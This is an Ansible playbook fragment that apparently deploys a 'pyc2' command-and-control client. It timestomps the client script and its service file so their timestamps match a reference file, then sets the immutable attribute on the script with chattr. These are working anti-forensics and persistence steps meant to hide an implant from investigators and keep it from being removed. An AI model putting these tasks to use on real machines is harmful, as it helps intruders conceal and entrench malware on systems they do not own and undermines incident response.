- name: Apply Timestomp to all deployed files
  ansible.builtin.file:
    path: "{{ item }}"
    state: file
    modification_time: "{{ unix_ref.stat.mtime | string | split('.') | first }}"
    access_time: "{{ unix_ref.stat.atime | string | split('.') | first }}"
  loop:
    - "{{ pyc2_client_location_unix }}"
    - "{{ (ansible_os_family == 'Debian') | ternary('/etc/systemd/system/' + pyc2_service_name + '.service', '/usr/local/etc/rc.d/' + pyc2_service_name) }}"

- name: Set immutable attribute on script
  command: "chattr +i {{ pyc2_client_location_unix }}"
  when: ansible_os_family != 'FreeBSD'